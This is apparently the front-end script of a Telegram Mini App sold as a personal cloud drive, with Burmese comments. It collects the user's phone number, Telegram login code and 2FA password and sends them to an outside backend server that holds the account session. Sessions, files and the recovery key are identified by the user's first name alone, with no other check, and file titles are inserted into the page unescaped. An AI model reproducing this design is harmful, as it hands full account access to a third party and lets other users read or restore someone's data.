const tg = window.Telegram.WebApp;
tg.expand();
tg.ready();

// 🔴 သင့် Render URL အမှန်ဖြင့် အစားထိုးပါ (အဆုံးတွင် / မပါရ)
const BACKEND_URL = "https://telegramcloudbackend.onrender.com";

let phoneHash = "", userPhone = "", pollingInterval, allFilesData = [];
let userName = tg.initDataUnsafe?.user?.first_name || "Cloud User";

function switchStep(stepId) {
    document.querySelectorAll(".step").forEach(el => el.classList.add("hidden"));
    let target = document.getElementById(stepId);
    if(target) target.classList.remove("hidden");
}

function setLoadingText(text) { document.getElementById("loading-text").innerText = text; }

// --- 💡 Auto Login Check ---
window.onload = async () => {
    switchStep("step-loading");

    let cached = localStorage.getItem(`cloudData_${userName}`);
    if (cached) {
        try {
            allFilesData = JSON.parse(cached);
            renderFilesGrid(allFilesData);
        } catch(e) {}
    }
    
    try {
        let res = await fetch(`${BACKEND_URL}/api/check_session`, {
            method: "POST", headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ name: userName })
        });
        let result = await res.json();
        
        if(result.exists) {
            switchStep("step-success");
            fetchCloudData();
        } else {
            let platform = tg.platform;
            if (platform === "tdesktop" || platform === "macos" || platform === "web" || platform === "weba") {
                document.getElementById("btn-share").classList.add("hidden");
                document.getElementById("desktop-input-area").classList.remove("hidden");
            }
            switchStep("step-phone");
        }
    } catch(e) { switchStep("step-phone"); }
};

// --- 📱 Phone Auth Flows ---
function handleMobileContact() {
    if (!tg.requestContact) return; 
    tg.requestContact(function(shared) {
        if (shared) {
            let userId = tg.initDataUnsafe?.user?.id;
            if (!userId) return alert("Error: User ID ဖတ်မရပါ။");
            
            setLoadingText("Requesting OTP...");
            switchStep("step-loading");
            pollingInterval = setInterval(() => checkContactReceived(userId), 2000);
            
            setTimeout(() => {
                if(pollingInterval) {
                    clearInterval(pollingInterval);
                    alert("Timeout: ချိတ်ဆက်မှု ကြန့်ကြာနေပါသည်။");
                    switchStep("step-phone");
                }
            }, 30000);
        }
    });
}

async function handleDesktopContact() {
    let phone = document.getElementById("manual_phone").value.trim();
    if (!phone) return alert("ဖုန်းနံပါတ် ရိုက်ထည့်ပါ။");
    if (!phone.startsWith("+")) phone = "+" + phone;
    userPhone = phone;
    setLoadingText("Sending code...");
    switchStep("step-loading");
    try {
        let res = await fetch(`${BACKEND_URL}/api/send_code`, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ phone: userPhone }) });
        let result = await res.json();
        if (result.success) { phoneHash = result.hash; switchStep("step-otp"); } 
        else { alert("Error: " + result.message); switchStep("step-phone"); }
    } catch (e) { alert("Connection Failed."); switchStep("step-phone"); }
}

async function checkContactReceived(userId) {
    try {
        let res = await fetch(`${BACKEND_URL}/api/check_contact`, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ user_id: userId }) });
        let result = await res.json();
        if (result.success) {
            clearInterval(pollingInterval); pollingInterval = null;
            userPhone = result.phone; phoneHash = result.hash;
            switchStep("step-otp"); tg.HapticFeedback.impactOccurred("medium");
        } else if (result.message) { 
            clearInterval(pollingInterval); pollingInterval = null;
            alert("Error: " + result.message); switchStep("step-phone");
        }
    } catch(e) {
        clearInterval(pollingInterval);
        pollingInterval = null;
        showToast("Connection Error. Please try again.", "error");
        switchStep("step-phone");
    }
}

async function verifyOTP() {
    let code = document.getElementById("otp_input").value;
    if(code.length !== 5) return alert("OTP ၅ လုံး ပြည့်အောင် ရိုက်ပါ။");
    setLoadingText("Verifying...");
    switchStep("step-loading");
    try {
        let res = await fetch(`${BACKEND_URL}/api/verify_code`, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ phone: userPhone, code: code, hash: phoneHash, name: userName }) });
        let result = await res.json();
        if(result.success) {
            switchStep("step-success"); tg.HapticFeedback.notificationOccurred("success"); fetchCloudData(); 
        } else if (result.message === "2FA_REQUIRED") { switchStep("step-2fa"); } 
        else { alert("Error: " + result.message); switchStep("step-otp"); }
    } catch(e) { alert("Verification Failed."); switchStep("step-otp"); }
}

async function verify2FA() {
    let password = document.getElementById("password_input").value;
    if(!password) return alert("Password ရိုက်ထည့်ပါ။");
    setLoadingText("Unlocking...");
    switchStep("step-loading");
    try {
        let res = await fetch(`${BACKEND_URL}/api/verify_code`, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ phone: userPhone, code: document.getElementById("otp_input").value, hash: phoneHash, name: userName, password: password }) });
        let result = await res.json();
        if(result.success) {
            switchStep("step-success"); tg.HapticFeedback.notificationOccurred("success"); fetchCloudData();
        } else { alert("Error: Password မှားယွင်းနေပါသည်။"); switchStep("step-2fa"); }
    } catch(e) { alert("Verification Failed."); switchStep("step-2fa"); }
}

let currentOffset = 0; // 💡 နောက်ဆုံးရောက်နေတဲ့ နေရာကို မှတ်ထားမည့် Global Variable

async function fetchCloudData(isLoadMore = false) {
    let statusText = document.getElementById("cloud-status");
    let grid = document.getElementById("cloud-files-grid");
    let loadMoreBtn = document.getElementById("btn-load-more");
    let loadMoreContainer = document.getElementById("load-more-container");
    
    if (!isLoadMore) {
        currentOffset = 0; // အစက ပြန်ဆွဲရင် 0 ကနေ ပြန်စမည်
        statusText.innerText = "Syncing with Telegram Cloud...";
        grid.innerHTML = "<div class='flex-center' style='grid-column: 1 / -1;'><div class='modern-spinner'></div></div>";
        loadMoreContainer.classList.add("hidden");
    } else {
        // Load More နှိပ်လိုက်ရင် Loading လည်နေစေရန်
        loadMoreBtn.innerHTML = "<i class='fa-solid fa-spinner fa-spin mr-2'></i> Loading...";
        loadMoreBtn.disabled = true;
    }
    
    try {
        let res = await fetch(`${BACKEND_URL}/api/get_cloud_data`, {
            method: "POST", headers: {"Content-Type": "application/json"}, 
            // 💡 offset_id ကိုပါ Backend သို့ တွဲပို့မည်
            body: JSON.stringify({ name: userName, offset_id: currentOffset })
        });
        let result = await res.json();
        
        if(result.success) {
            if (isLoadMore) {
                // အဟောင်းထဲကို အသစ်ရလာတဲ့ data တွေ ဆက်ပေါင်းထည့်မည် (Concat)
                allFilesData = allFilesData.concat(result.files);
            } else {
                allFilesData = result.files;
            }

            // 💡 ပြီးပြည့်စုံသော Data Cache စနစ် (Base64 ဖယ်ထုတ်ပြီး သိမ်းမည်)
            let cacheData = allFilesData.map(f => {
                let { thumb_data, ...rest } = f; 
                return rest;
            });
            localStorage.setItem(`cloudData_${userName}`, JSON.stringify(cacheData));
            
            statusText.innerText = `${allFilesData.length} items synced.`;
            
            // UI တွင် ပြန်လည်ရေးဆွဲမည်
            let activeCategory = document.querySelector('.nav-links li.active, .bottom-nav .nav-item.active')?.innerText.toLowerCase() || 'my drive';
            let type = activeCategory.includes('photo') ? 'photo' : (activeCategory.includes('doc') ? 'doc' : (activeCategory.includes('note') ? 'text' : 'all'));
            renderFilesGrid(type === 'all' ? allFilesData : allFilesData.filter(f => f.type === type));

            // 💡 နောက်တစ်ခါ Load More နှိပ်ရန် offset ကို မှတ်ထားမည်
            if (result.files.length > 0 && result.next_offset) {
                currentOffset = result.next_offset;
                // ဖိုင် ၅၀ အပြည့်ပါလာရင် နောက်ထပ်ကျန်နိုင်သေးလို့ Button ကို ဆက်ပြထားမည်
                if (result.files.length === 50) {
                    loadMoreContainer.classList.remove("hidden");
                } else {
                    loadMoreContainer.classList.add("hidden");
                }
            } else {
                loadMoreContainer.classList.add("hidden");
            }

        } else {
            if (result.session_expired) {
                tg.HapticFeedback.notificationOccurred("error");
                alert("Session Expired: သင်၏ အကောင့် Terminate လုပ်ခံရသဖြင့် ပြန်လည် ချိတ်ဆက်ပေးပါ။");
                window.location.reload(); 
            } else {
                if (!isLoadMore) statusText.innerText = "Sync failed.";
                else showToast("Failed to load more files.", "error");
            }
        }
    } catch(e) { 
        if (!isLoadMore) statusText.innerText = "Connection error."; 
        else showToast("Connection error.", "error");
    }

    // Button ကို မူလအခြေအနေသို့ ပြန်ထားမည်
    if (isLoadMore) {
        loadMoreBtn.innerHTML = "<i class='fa-solid fa-cloud-arrow-down mr-2'></i> Load More"; 
        loadMoreBtn.disabled = false;
    }
}

// 💡 Load More Button နှိပ်လျှင် ခေါ်မည့် Function အသစ်
function loadMoreFiles() {
    fetchCloudData(true);
}

function renderFilesGrid(files) {
    let html = "";
    if(files.length === 0) {
        html = "<div class='flex-center' style='grid-column: 1 / -1; color: var(--text-muted);'><i class='fa-brands fa-google-drive mb-2' style='font-size:40px;'></i><p>Your drive is empty.</p></div>";
    } else {
        files.forEach(f => {
            // 💡 ပြင်ဆင်ချက် - ဖိုင်တစ်ခုခု မှားယွင်းနေရင်တောင် ကျန်တဲ့ဖိုင်တွေ ဆက်ပေါ်အောင် try...catch ဖြင့် ကာကွယ်ထားပါသည်
            try {
                let iconClass = f.type === "doc" ? "fa-file-lines doc" : (f.type === "photo" ? "fa-image photo" : "fa-note-sticky text");
                let thumbHtml = "";
                
                if (f.thumb_data) {
                    thumbHtml = `<img src="${f.thumb_data}" class="fc-thumb" loading="lazy" onerror="this.outerHTML='<i class=\\'fa-solid ${iconClass} fc-icon\\'></i>'">`;
                } else {
                    thumbHtml = `<i class="fa-solid ${iconClass} fc-icon"></i>`;
                }

                // 💡 ပြင်ဆင်ချက် - f.title သည် null ဖြစ်နေပါက 'Unknown File' ဟု အလိုအလျောက် သတ်မှတ်ပေးမည်
                let safeTitle = f.title ? f.title.replace(/'/g, "\\'").replace(/"/g, "&quot;") : "Unknown File";
                let displayTitle = f.title ? f.title : "Unknown File";

                html += `
                <div class="file-card" onclick="openFile(${f.id}, '${f.type}', '${safeTitle}')">
                    ${thumbHtml}
                    <div class="fc-title">${displayTitle}</div>
                    <div class="fc-meta">${f.size || f.date}</div>
                </div>`;
            } catch (err) {
                console.error("Render error on File ID:", f.id, err);
            }
        });
    }
    document.getElementById("cloud-files-grid").innerHTML = html;
}

function filterFiles(type, element) {
    document.querySelectorAll('.nav-links li, .nav-item').forEach(el => el.classList.remove('active'));
    if(element) element.classList.add('active');
    document.getElementById('current-category').innerText = { 'all': 'My Drive', 'photo': 'Photos', 'doc': 'Documents', 'text': 'Notes' }[type];
    renderFilesGrid(type === 'all' ? allFilesData : allFilesData.filter(f => f.type === type));
}

function searchFiles(query) {
    let lowerQ = query.toLowerCase();
    renderFilesGrid(allFilesData.filter(f => f.title.toLowerCase().includes(lowerQ)));
}

async function saveCloudNote() {
    let noteInput = document.getElementById("note_input");
    let text = noteInput.value.trim();
    if(!text) return;
    let btn = event.target.closest('button');
    btn.innerHTML = "<i class='fa-solid fa-spinner fa-spin'></i>"; btn.disabled = true;
    try {
        await fetch(`${BACKEND_URL}/api/upload_note`, {
            method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ name: userName, text: text })
        });
        noteInput.value = ""; tg.HapticFeedback.notificationOccurred("success"); fetchCloudData(); 
    } catch(e) {
        showToast("Failed to save note. Check connection.", "error");
    }
    btn.innerHTML = "<i class='fa-solid fa-paper-plane'></i>"; btn.disabled = false;
}

// 💡 တင့်တယ်လှပသော Toast မက်ဆေ့ချ် ပြသမည့် Function
function showToast(message, type = "normal") {
    let existing = document.querySelector(".toast");
    if(existing) existing.remove(); // အဟောင်းရှိရင်ဖျက်မည်

    let toast = document.createElement("div");
    toast.className = `toast ${type}`;
    toast.innerHTML = message;
    document.body.appendChild(toast);
    
    // ၃ စက္ကန့်အကြာတွင် အလိုအလျောက် ပျောက်သွားမည်
    setTimeout(() => {
        toast.style.animation = "fadeOut 0.3s forwards";
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

// 🚀 --- ဖိုင်နှိပ်လျှင် App မပိတ်ဘဲ Chat ထဲသို့ တိုက်ရိုက်ပို့မည့် UX --- 🚀
async function openFile(msgId) {
    tg.HapticFeedback.impactOccurred("medium");
    
    // ပို့နေကြောင်း User အား အသိပေးမည်
    showToast("<i class='fa-solid fa-spinner fa-spin mr-2'></i> Sending to chat...", "normal");
    
    try {
        let res = await fetch(`${BACKEND_URL}/api/view_file`, {
            method: "POST", headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ name: userName, msg_id: msgId })
        });
        let result = await res.json();
        
        if(result.success) {
            tg.HapticFeedback.notificationOccurred("success");
            // အောင်မြင်ပါက Swipe Down လုပ်ရန် အသိပေးမည် (App မပိတ်ပါ)
            showToast("<i class='fa-solid fa-check mr-2'></i> Ready! Swipe down app to view.", "success");
        } else {
            showToast("<i class='fa-solid fa-xmark mr-2'></i> Failed to send.", "error");
        }
    } catch(e) {
        showToast("Connection error.", "error");
    }
}

// ⚙️ --- SETTINGS & DISASTER RECOVERY --- ⚙️
async function openSettings() {
    tg.HapticFeedback.impactOccurred("light");
    document.getElementById("settings-modal").classList.remove("hidden");
    
    // Recovery Key လှမ်းယူမည်
    try {
        let res = await fetch(`${BACKEND_URL}/api/get_recovery_key`, {
            method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ name: userName })
        });
        let result = await res.json();
        if(result.success) document.getElementById("recovery_key_display").innerText = result.key;
    } catch(e) { document.getElementById("recovery_key_display").innerText = "Error loading key"; }
}

function closeSettings() { document.getElementById("settings-modal").classList.add("hidden"); }

async function backupNow() {
    let btn = event.target.closest('button');
    btn.innerHTML = "<i class='fa-solid fa-spinner fa-spin mr-2'></i> Backing up..."; btn.disabled = true;
    try {
        let res = await fetch(`${BACKEND_URL}/api/backup_all`, {
            method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ name: userName })
        });
        let result = await res.json();
        if(result.success) showToast(`<i class='fa-solid fa-check mr-2'></i> ${result.count} files securely backed up!`, "success");
        else showToast("Backup failed.", "error");
    } catch(e) { showToast("Connection error.", "error"); }
    btn.innerHTML = "<i class='fa-solid fa-cloud-arrow-up mr-2'></i> Sync & Backup All Files"; btn.disabled = false;
}

async function restoreCloud() {
    let keyInput = document.getElementById("restore_key_input").value.trim();
    if(!keyInput) return alert("Please enter a Recovery Key.");
    
    let btn = event.target.closest('button');
    btn.innerHTML = "<i class='fa-solid fa-spinner fa-spin mr-2'></i> Restoring Data..."; btn.disabled = true;
    try {
        let res = await fetch(`${BACKEND_URL}/api/restore_cloud`, {
            method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ name: userName, key: keyInput })
        });
        let result = await res.json();
        if(result.success) {
            closeSettings();
            showToast(`<i class='fa-solid fa-check mr-2'></i> Successfully restored ${result.count} files!`, "success");
            fetchCloudData(); // Data အသစ်များကို ချက်ချင်း ပြန်ဆွဲပြမည်
        } else {
            alert("Error: " + (result.message || "Invalid Key."));
        }
    } catch(e) { alert("Restore Failed."); }
    btn.innerHTML = "<i class='fa-solid fa-rotate-left mr-2'></i> Restore Now"; btn.disabled = false;
}
